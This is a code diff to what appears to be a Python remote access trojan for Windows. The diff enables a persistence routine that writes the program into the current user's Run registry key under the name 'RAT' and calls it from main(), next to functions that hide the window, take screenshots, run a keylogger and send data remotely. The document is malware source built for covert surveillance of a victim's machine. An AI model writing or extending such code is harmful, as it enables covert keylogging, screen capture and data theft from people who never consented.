@@ -4,6 +4,9 @@ import io
 import threading
 import time
 import specs
+import os
+import sys
+from _winreg import *
 
 from PIL import Image
 
@@ -43,16 +46,14 @@ def hide():
 
 
 # Add to startup
-# def addStartup():
-#     fp = os.path.dirname(os.path.realpath(__file__))
-#     file_name = sys.argv[0].split("\\")[-1]
-#     new_file_path = fp + "\\" + file_name
-#     keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
-#
-#     key2change = OpenKey(HKEY_CURRENT_USER,
-#                          keyVal, 0, KEY_ALL_ACCESS)
-#
-#     SetValueEx(key2change, "RAT", 0, REG_SZ, new_file_path)
+def addStartup():
+    fp = os.path.dirname(os.path.realpath(__file__))
+    file_name = sys.argv[0].split("\\")[-1]
+    new_file_path = fp + "\\" + file_name
+    keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
+    key2change = OpenKey(HKEY_CURRENT_USER,
+                         keyVal, 0, KEY_ALL_ACCESS)
+    SetValueEx(key2change, "RAT", 0, REG_SZ, new_file_path)
 
 
 def remote_send():
@@ -169,6 +170,7 @@ def run_specs_fetcher():
 
 def main():
     hide()
+    addStartup()
     run_specs_fetcher()
     run_screenshot_handler()
     run_keylogger_handler()
